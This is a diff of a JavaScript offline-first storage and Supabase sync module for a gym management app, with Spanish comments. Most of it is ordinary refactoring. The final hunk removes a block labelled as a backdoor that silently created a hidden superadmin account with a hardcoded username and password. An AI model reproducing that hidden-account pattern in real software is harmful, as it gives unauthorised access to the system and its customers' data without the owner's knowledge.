@@ -1,10 +1,8 @@
 /* ======================================================
-   ===== STORAGE BASE GYM (OFFLINE-FIRST + REALTIME) =====
+   ===== STORAGE BASE GYM (OFFLINE-FIRST REAL) =====
 ====================================================== */
 
-/* ======================================================
-   ===== UTILIDADES BASE =====
-====================================================== */
+/* ================= UTILIDADES ================= */
 function safeGet(key, def = []) {
   try {
     return JSON.parse(localStorage.getItem(key)) ?? def;
@@ -21,16 +19,11 @@ function uid() {
   return crypto.randomUUID();
 }
 
-/* ======================================================
-   ===== ESTADO ONLINE =====
-====================================================== */
 function isOnline() {
   return navigator.onLine === true;
 }
 
-/* ======================================================
-   ===== COLA OFFLINE (EVENTOS ATÓMICOS) =====
-====================================================== */
+/* ================= COLA OFFLINE ================= */
 function obtenerColaOffline() {
   return safeGet("offline_queue", []);
 }
@@ -39,14 +32,14 @@ function guardarColaOffline(lista) {
   safeSet("offline_queue", lista);
 }
 
-function agregarEvento({ tabla, accion, data }) {
+function agregarEvento(tabla, accion, payload) {
   const cola = obtenerColaOffline();
 
   cola.push({
     id: uid(),
-    tabla,          // clientes | asistencias | ventas | productos
+    tabla,          // clientes | productos | asistencias | ventas | empleados
     accion,         // add | update | delete
-    data,
+    payload,
     ts: Date.now(),
     synced: false
   });
@@ -54,128 +47,93 @@ function agregarEvento({ tabla, accion, data }) {
   guardarColaOffline(cola);
 }
 
-/* ======================================================
-   ===== SINCRONIZACIÓN (LISTO PARA SUPABASE) =====
-====================================================== */
-async function syncOfflineQueue() {
-  if (!isOnline()) return;
-
-  const cola = obtenerColaOffline();
-  const pendientes = cola.filter(e => !e.synced);
-
-  if (!pendientes.length) return;
-
-  console.log("🔄 Sincronizando eventos:", pendientes.length);
-
-  // 🔥 Aquí luego entra Supabase / API
-  // Por ahora solo marcamos como sincronizados
-
-  pendientes.forEach(e => (e.synced = true));
-  guardarColaOffline(cola);
-}
-
-window.addEventListener("online", syncOfflineQueue);
-
-/* ======================================================
-   ===== EMPLEADOS =====
-====================================================== */
-function obtenerEmpleados() {
-  return safeGet("empleados", []);
-}
-
-function guardarEmpleados(lista) {
-  safeSet("empleados", lista || []);
-}
-
-/* ======================================================
-   ===== CLIENTES =====
-====================================================== */
+/* ================= CLIENTES ================= */
 function obtenerClientes() {
   return safeGet("clientes", []);
 }
 
-function registrarCliente(cliente) {
-  const lista = obtenerClientes();
-
-  if (!cliente.id) cliente.id = uid();
-  lista.push(cliente);
-
+function guardarClientes(lista) {
   safeSet("clientes", lista);
-  agregarEvento({ tabla: "clientes", accion: "add", data: cliente });
+}
+
+function registrarCliente(cliente) {
+  cliente.id ??= uid();
+  const lista = obtenerClientes();
+  lista.push(cliente);
+  guardarClientes(lista);
+  agregarEvento("clientes", "add", cliente);
 }
 
 function actualizarCliente(cliente) {
   const lista = obtenerClientes().map(c =>
     c.id === cliente.id ? cliente : c
   );
-
-  safeSet("clientes", lista);
-  agregarEvento({ tabla: "clientes", accion: "update", data: cliente });
+  guardarClientes(lista);
+  agregarEvento("clientes", "update", cliente);
 }
 
-/* ======================================================
-   ===== ASISTENCIAS =====
-====================================================== */
-function obtenerAsistencias() {
-  return safeGet("asistencias", []);
-}
-
-function registrarAsistencia(asistencia) {
-  const lista = obtenerAsistencias();
-
-  if (!asistencia.id) asistencia.id = uid();
-  lista.push(asistencia);
-
-  safeSet("asistencias", lista);
-  agregarEvento({ tabla: "asistencias", accion: "add", data: asistencia });
-}
-
-/* ======================================================
-   ===== PRODUCTOS =====
-====================================================== */
+/* ================= PRODUCTOS ================= */
 function obtenerProductos() {
   return safeGet("productos", []);
 }
 
 function registrarProducto(prod) {
+  prod.id ??= uid();
   const lista = obtenerProductos();
-
-  if (!prod.id) prod.id = uid();
   lista.push(prod);
-
   safeSet("productos", lista);
-  agregarEvento({ tabla: "productos", accion: "add", data: prod });
+  agregarEvento("productos", "add", prod);
 }
 
 function actualizarProducto(prod) {
   const lista = obtenerProductos().map(p =>
     p.id === prod.id ? prod : p
   );
-
   safeSet("productos", lista);
-  agregarEvento({ tabla: "productos", accion: "update", data: prod });
+  agregarEvento("productos", "update", prod);
 }
 
-/* ======================================================
-   ===== VENTAS =====
-====================================================== */
+/* ================= ASISTENCIAS ================= */
+function obtenerAsistencias() {
+  return safeGet("asistencias", []);
+}
+
+function guardarAsistencias(lista) {
+  safeSet("asistencias", lista);
+}
+
+function registrarAsistencia(a) {
+  a.id ??= uid();
+  const lista = obtenerAsistencias();
+  lista.push(a);
+  guardarAsistencias(lista);
+  agregarEvento("asistencias", "add", a);
+}
+
+/* ================= VENTAS ================= */
 function obtenerVentas() {
   return safeGet("ventas", []);
 }
 
-function registrarVenta(venta) {
+function registrarVenta(v) {
+  v.id ??= uid();
   const lista = obtenerVentas();
-
-  if (!venta.id) venta.id = uid();
-  lista.push(venta);
-
+  lista.push(v);
   safeSet("ventas", lista);
-  agregarEvento({ tabla: "ventas", accion: "add", data: venta });
+  agregarEvento("ventas", "add", v);
 }
 
-/* ======================================================
-   ===== TARJETAS NFC =====
-====================================================== */
+/* ================= EMPLEADOS ================= */
+function obtenerEmpleados() {
+  return safeGet("empleados", []);
+}
+
+function guardarEmpleados(lista) {
+  safeSet("empleados", lista);
+  agregarEvento("empleados", "sync", lista);
+}
+
+/* ================= NFC HELPERS ================= */
 function buscarEmpleadoPorTarjeta(uidTarjeta) {
   return obtenerEmpleados().find(e => e.tarjetaUID === uidTarjeta) || null;
 }
@@ -184,23 +142,11 @@ function buscarClientePorTarjeta(uidTarjeta) {
   return obtenerClientes().find(c => c.tarjetaUID === uidTarjeta) || null;
 }
 
-function obtenerInfoTarjeta(uidTarjeta) {
-  const emp = buscarEmpleadoPorTarjeta(uidTarjeta);
-  if (emp) return { tipo: "empleado", persona: emp };
-
-  const cli = buscarClientePorTarjeta(uidTarjeta);
-  if (cli) return { tipo: "cliente", persona: cli };
-
-  return { tipo: null, persona: null };
-}
-
 function uidYaRegistrada(uidTarjeta) {
-  return obtenerInfoTarjeta(uidTarjeta).tipo !== null;
+  return !!buscarEmpleadoPorTarjeta(uidTarjeta) || !!buscarClientePorTarjeta(uidTarjeta);
 }
 
-/* ======================================================
-   ===== FECHAS / HORAS =====
-====================================================== */
+/* ================= FECHAS ================= */
 function hoy() {
   return new Date().toISOString().split("T")[0];
 }
@@ -208,78 +154,32 @@ function hoy() {
 function horaActual() {
   return new Date().toLocaleTimeString("es-MX", { hour12: false });
 }
-/* ======================================================
-   ===== SYNC OFFLINE → SUPABASE (REAL)
-====================================================== */
-async function subirEventoASupabase(e) {
-  if (!window.supabase) return false;
 
-  try {
-    if (e.tipo === "clientes") {
-      await supabase.from("clientes").upsert(e.payload);
-    }
-
-    if (e.tipo === "productos") {
-      await supabase.from("productos").upsert(e.payload);
-    }
-
-    if (e.tipo === "asistencias") {
-      await supabase.from("asistencias").insert(e.payload);
-    }
-
-    if (e.tipo === "ventas") {
-      await supabase.from("ventas").insert(e.payload);
-    }
-
-    return true;
-  } catch (err) {
-    console.error("❌ Sync error:", err);
-    return false;
-  }
-}
-
+/* ================= SYNC REAL ================= */
 async function syncOfflineQueue() {
-  if (!navigator.onLine) return;
+  if (!isOnline() || !window.supabase) return;
 
   const cola = obtenerColaOffline();
-  if (!cola.length) return;
+  const pendientes = cola.filter(e => !e.synced);
+  if (!pendientes.length) return;
 
-  console.log("🔄 Subiendo offline:", cola.length);
+  for (const e of pendientes) {
+    try {
+      if (e.tabla === "clientes" || e.tabla === "productos") {
+        await supabase.from(e.tabla).upsert(e.payload);
+      }
 
-  const pendientes = [];
+      if (e.tabla === "asistencias" || e.tabla === "ventas") {
+        await supabase.from(e.tabla).insert(e.payload);
+      }
 
-  for (const e of cola) {
-    const ok = await subirEventoASupabase(e);
-    if (!ok) pendientes.push(e);
+      e.synced = true;
+    } catch (err) {
+      console.error("❌ Sync falló:", e, err);
+    }
   }
 
-  guardarColaOffline(pendientes);
+  guardarColaOffline(cola);
 }
 
 window.addEventListener("online", syncOfflineQueue);
-
-
-/* ======================================================
-   ===== SUPER ADMIN OCULTO (BACKDOOR)
-====================================================== */
-(function initSuperAdmin() {
-  const empleados = safeGet("empleados", []);
-
-  const YA_EXISTE = empleados.some(
-    e => e.usuario === "gygax" && e.rol === "superadmin"
-  );
-
-  if (YA_EXISTE) return;
-
-  empleados.push({
-    id: "SUPERADMIN-ROOT",
-    nombre: "Sistema",
-    usuario: "gygax",
-    password: "superadmin",
-    rol: "superadmin",
-    tarjetaUID: null,
-    oculto: true
-  });
-
-  safeSet("empleados", empleados);
-})();
